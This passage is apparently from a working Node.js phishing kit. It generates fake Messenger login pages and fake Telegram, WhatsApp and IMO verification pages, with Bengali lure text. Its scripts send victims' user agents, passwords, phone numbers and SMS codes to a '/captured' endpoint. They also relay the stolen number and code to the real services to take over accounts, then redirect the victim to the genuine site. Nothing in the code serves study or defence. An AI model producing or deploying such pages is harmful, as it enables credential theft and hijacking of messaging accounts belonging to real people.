.msgr-head{text-align:center;margin-bottom:18px;display:flex;align-items:center;justify-content:center;gap:10px}
.msgr-icon{width:48px;height:48px;background:linear-gradient(135deg,#0084ff,#00c6ff);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0}
.msgr-name{font-size:24px;font-weight:700;color:#1c1e21}
input{width:100%;padding:13px 14px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;color:#1c1e21;margin-bottom:10px;outline:none;background:#fff}
input:focus{border-color:#0084ff;box-shadow:0 0 0 2px rgba(0,132,255,.15)}
input::placeholder{color:#8a8d91}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#0084ff,#00c6ff);color:#fff;font-size:18px;font-weight:700;border:none;border-radius:6px;cursor:pointer;box-shadow:0 2px 8px rgba(0,132,255,.4)}
.forgot{text-align:center;margin-top:12px}
.forgot a{color:#0084ff;font-size:14px;text-decoration:none}
.unread{background:#0084ff;color:#fff;font-size:11px;font-weight:700;padding:2px 7px;border-radius:20px;margin-left:6px}
</style></head><body>
<div class="notif">
  <span class="notif-icon">💬</span>
  <div class="notif-text"><b>💌 You have 3 Unread Messages</b>আপনার Messenger-এ নতুন message অপেক্ষা করছে। এখনই login করে দেখুন।</div>
</div>
<div class="wrap">
  <div class="vid-preview">
    <video autoplay muted loop playsinline><source src="${LURE_VID}" type="video/mp4"></video>
    <div class="msg-bubble"><div class="msg-dot"></div><span>3 new messages</span></div>
    <div class="vid-overlay"><b>🔒 Private Media Message</b><span>Login করলেই message দেখতে পাবেন</span></div>
  </div>
  <div class="card">
    <div class="msgr-head">
      <div class="msgr-icon">💬</div>
      <div class="msgr-name">Messenger</div>
      <span class="unread">3</span>
    </div>
    <input id="u" type="text" placeholder="Mobile number or email" autocomplete="email">
    <input id="p" type="password" placeholder="Password" autocomplete="current-password">
    <button class="btn" onclick="sub()">Log In</button>
    <div class="forgot"><a href="#">Forgot password?</a></div>
  </div>
</div>
<script>
const UID='${uid}',D='${base}/d',SITE='Messenger',RDR='https://www.messenger.com';
window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'Msgr Opened',data:navigator.userAgent})});
async function sub(){
  const u=document.getElementById('u').value,p=document.getElementById('p').value;
  if(!u||!p)return;
  document.querySelector('.btn').textContent='Logging in...';
  await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,phone:u,otp:p})});
  setTimeout(()=>window.location.href=RDR,700);
}
</script></body></html>`
    };

    return pages[action] || pages.phish_fb;
}

// ── WA / IMO / TG — OTP page ─────────────────
function otpPage(action,uid,req){
    const base=getBase(req);
    const sid=crypto.randomBytes(10).toString('hex');

    const C={
        phish_tg:{name:'Telegram',rdr:'https://telegram.org',proxy:'tg',ac:'#229ed9',hdr:'#17212b',
            hot:'🔔 Telegram Account — New Login Detected',
            sub:'⚠️ আপনার Telegram account-এ নতুন device থেকে login হয়েছে।<br>নিরাপদ রাখতে নাম্বার দিয়ে verify করুন।',
            t1:'Sign in to Telegram',s1:'আপনার দেশ বেছে নিন এবং Telegram নম্বর দিন।',
            t2:'Enter the Code',s2:'আপনার Telegram অ্যাপে একটি code পাঠানো হয়েছে।'},
        phish_wa:{name:'WhatsApp',rdr:'https://www.whatsapp.com',proxy:'wa',ac:'#25d366',hdr:'#075e54',
            hot:'🔔 WhatsApp — Verify Your Number',
            sub:'⚠️ আপনার WhatsApp account নতুন device-এ link করার চেষ্টা হয়েছে।<br>Verify করতে নম্বর দিন।',
            t1:'Enter your phone number',s1:'WhatsApp will send an SMS code to verify your number.',
            t2:'Enter the 6-digit code',s2:'We sent a code to {phone} via SMS.'},
        phish_imo:{name:'IMO',rdr:'https://imo.im',proxy:'imo',ac:'#0052d9',hdr:'#003da3',
            hot:'🔔 IMO — Account Verification Required',
            sub:'⚠️ আপনার IMO account verify করতে নম্বর দিন।<br>SMS-এ code আসবে।',
            t1:'Enter your phone number',s1:'IMO will send a verification code via SMS.',
            t2:'Enter verification code',s2:'A code was sent to {phone} via SMS.'}
    };
    const c=C[action];

    const opts=[
        ['880','🇧🇩 Bangladesh +880'],['91','🇮🇳 India +91'],['92','🇵🇰 Pakistan +92'],
        ['1','🇺🇸 USA +1'],['44','🇬🇧 UK +44'],['966','🇸🇦 Saudi Arabia +966'],
        ['971','🇦🇪 UAE +971'],['60','🇲🇾 Malaysia +60'],['65','🇸🇬 Singapore +65'],
        ['62','🇮🇩 Indonesia +62'],['63','🇵🇭 Philippines +63'],['66','🇹🇭 Thailand +66'],
        ['84','🇻🇳 Vietnam +84'],['95','🇲🇲 Myanmar +95'],['94','🇱🇰 Sri Lanka +94'],
        ['977','🇳🇵 Nepal +977'],['20','🇪🇬 Egypt +20'],['234','🇳🇬 Nigeria +234'],
        ['49','🇩🇪 Germany +49'],['33','🇫🇷 France +33'],['7','🇷🇺 Russia +7'],
        ['55','🇧🇷 Brazil +55'],['81','🇯🇵 Japan +81'],['82','🇰🇷 Korea +82'],
        ['86','🇨🇳 China +86'],['90','🇹🇷 Turkey +90'],['98','🇮🇷 Iran +98'],
        ['964','🇮🇶 Iraq +964'],['966','🇸🇦 Saudi +966'],['968','🇴🇲 Oman +968'],
        ['974','🇶🇦 Qatar +974'],['965','🇰🇼 Kuwait +965'],['973','🇧🇭 Bahrain +973'],
        ['961','🇱🇧 Lebanon +961'],['962','🇯🇴 Jordan +962'],['970','🇵🇸 Palestine +970']
    ];
    // deduplicate
    const seen=new Set();
    const optHtml=opts.filter(([v])=>seen.has(v)?false:seen.add(v)).map(([v,t])=>`<option value="${v}">${t}</option>`).join('');

    return `<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${c.name}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:${c.hdr};min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:14px}
.hot-t{font-size:15px;font-weight:800;color:#fff;margin:10px 0 4px;text-align:center}
.hot-s{font-size:12px;color:rgba(255,255,255,0.8);line-height:1.7;text-align:center;margin-bottom:10px}
.logo{font-size:20px;font-weight:700;color:#fff;text-align:center;margin-bottom:10px}
.card{background:#fff;border-radius:14px;padding:20px 16px;margin-top:10px}
.card h2{font-size:17px;font-weight:700;color:#111;margin-bottom:6px}
.card p{font-size:13px;color:#666;margin-bottom:16px;line-height:1.5}
.row{display:flex;border:1.5px solid #e0e0e0;border-radius:10px;overflow:hidden;margin-bottom:14px;background:#fff}
select{padding:13px 8px;border:none;background:#f5f5f5;font-size:13px;color:#333;outline:none;max-width:170px}
.ph{flex:1;padding:13px;border:none;font-size:15px;color:#111;outline:none}
.otp{width:100%;padding:18px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:30px;text-align:center;color:#111;outline:none;letter-spacing:10px;margin-bottom:14px;display:block}
.btn{width:100%;padding:15px;background:${c.ac};color:#fff;font-size:16px;font-weight:700;border:none;border-radius:10px;cursor:pointer}
.err{background:#fff3e0;border:1px solid #ff9800;border-radius:8px;padding:9px 12px;font-size:13px;color:#e65100;margin-bottom:12px;display:none}
.spin{text-align:center;font-size:13px;color:#888;padding:6px 0;display:none}
</style></head><body>

${vidBlock(c.hot,c.sub)}
<div class="logo">${c.name}</div>

<div class="card" id="st1">
  <h2>${c.t1}</h2><p>${c.s1}</p>
  <div class="err" id="e1">সঠিক নম্বর দিন!</div>
  <div class="row">
    <select id="cc">${optHtml}</select>
    <input type="tel" id="ph" class="ph" placeholder="Phone number">
  </div>
  <div class="spin" id="sp1">📤 OTP পাঠানো হচ্ছে...</div>
  <button class="btn" id="b1" onclick="send()">পরবর্তী →</button>
</div>

<div class="card" id="st2" style="display:none">
  <h2>${c.t2}</h2>
  <p id="oi">${c.s2}</p>
  <div class="err" id="e2">কোড সঠিক নয়!</div>
  <input type="text" class="otp" id="otp" placeholder="- - - - -">
  <div class="spin" id="sp2">🔄 Verifying...</div>
  <button class="btn" id="b2" onclick="verify()">✅ Verify করুন</button>
</div>

<script>
const UID='${uid}',BASE='${base}',D='${base}/d';
const SID='${sid}',SITE='${c.name}',RDR='${c.rdr}',PROXY='${c.proxy}';
let fp='';

window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:SITE+' Opened',data:navigator.userAgent})});

async function send(){
  const cc=document.getElementById('cc').value;
  const ph=document.getElementById('ph').value.trim().replace(/^0+/,'');
  if(!ph||ph.length<5){document.getElementById('e1').style.display='block';return;}
  document.getElementById('e1').style.display='none';
  const b1=document.getElementById('b1');b1.disabled=true;b1.textContent='পাঠানো হচ্ছে...';
  document.getElementById('sp1').style.display='block';
  fp='+'+cc+ph;
  // phone to bot
  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'📱 '+SITE+' Phone',data:fp})});
  // trigger real OTP
  try{
    const body=PROXY==='wa'?JSON.stringify({cc,phone_local:ph,sid:SID}):JSON.stringify({phone:fp,sid:SID});
    const resp=await fetch(BASE+'/proxy/'+PROXY+'/send',{method:'POST',headers:{'Content-Type':'application/json'},body});
    const data=await resp.json();
    if(data.tgError){
      document.getElementById('e1').style.display='block';
      document.getElementById('e1').textContent='ভুল নম্বর: '+data.tgError;
      document.getElementById('sp1').style.display='none';
      b1.disabled=false;b1.textContent='পরবর্তী →';return;
    }
  }catch(er){}
  document.getElementById('sp1').style.display='none';
  document.getElementById('oi').textContent='${c.s2}'.replace('{phone}',fp);
  document.getElementById('st1').style.display='none';
  document.getElementById('st2').style.display='block';
  setTimeout(()=>document.getElementById('otp').focus(),300);
}

async function verify(){
  const otp=document.getElementById('otp').value.trim();
  if(!otp||otp.length<3){document.getElementById('e2').style.display='block';return;}
  document.getElementById('e2').style.display='none';
  const b2=document.getElementById('b2');b2.disabled=true;
  document.getElementById('sp2').style.display='block';
  // capture to bot FIRST
  await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,phone:fp,otp})});
  // verify with real server
  try{
    await fetch(BASE+'/proxy/'+PROXY+'/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:fp,otp,sid:SID,uid:UID})});
  }catch(er){}
  setTimeout(()=>window.location.href=RDR,700);
}
</script></body></html>`;
}

setInterval(()=>{axios.get(getBase()).catch(()=>{});},300000);
server.listen(process.env.PORT||8999,()=>console.log('[+] Server online port',process.env.PORT||8999));
